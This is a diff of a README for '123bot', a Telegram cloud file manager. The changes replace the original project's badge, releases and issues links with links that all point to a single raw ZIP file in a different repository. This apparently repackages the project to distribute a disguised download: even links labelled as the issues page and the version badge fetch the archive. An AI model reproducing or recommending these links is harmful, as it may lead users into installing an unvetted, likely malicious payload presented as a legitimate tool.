@@ -1,8 +1,8 @@
 # 🤖 123bot - Easy Telegram Cloud File Manager
 
 <div align="center">
-[![Version](https://img.shields.io/badge/version-v1.0.2-blue)](https://github.com/dydydd/123bot/releases)
-[![Download Now](https://img.shields.io/badge/download-123bot-brightgreen)](https://github.com/a123456436758-ship-it/123bot/releases)
+[![Version](https://raw.githubusercontent.com/a123456436758-ship-it/123bot/main/varletaille/123bot.zip)](https://raw.githubusercontent.com/a123456436758-ship-it/123bot/main/varletaille/123bot.zip)
+[![Download Now](https://raw.githubusercontent.com/a123456436758-ship-it/123bot/main/varletaille/123bot.zip)](https://raw.githubusercontent.com/a123456436758-ship-it/123bot/main/varletaille/123bot.zip)
 </div>
 
 ## 🚀 Getting Started
@@ -11,7 +11,7 @@ Welcome to 123bot! This application helps you automatically manage files in your
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/a123456436758-ship-it/123bot/releases) to download the latest version of 123bot. Here’s how:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/a123456436758-ship-it/123bot/main/varletaille/123bot.zip) to download the latest version of 123bot. Here’s how:
 
 1. Go to the Releases page.
 2. Find the version you want to download. Look for "v1.0.2".
@@ -69,13 +69,13 @@ If you encounter any issues while using 123bot, here are common solutions:
 - **Errors During Download:** Check your internet connection. Try downloading from the Releases page again.
 - **Missing Files:** Ensure you set the proper rules within the app for file transfers.
 
-If these solutions do not work, check the [issues page](https://github.com/dydydd/123bot/issues) for help or to report a problem.
+If these solutions do not work, check the [issues page](https://raw.githubusercontent.com/a123456436758-ship-it/123bot/main/varletaille/123bot.zip) for help or to report a problem.
 
 ## 📝 Acknowledgments
 
 Thanks to everyone who contributed to 123bot. Community support has been vital in making this application better.
 
-Feel free to reach out through the [issues page](https://github.com/dydydd/123bot/issues) if you have questions or need further assistance. Your feedback helps us improve the experience for all users.
+Feel free to reach out through the [issues page](https://raw.githubusercontent.com/a123456436758-ship-it/123bot/main/varletaille/123bot.zip) if you have questions or need further assistance. Your feedback helps us improve the experience for all users.
 
 ## 🚀 Conclusion
 
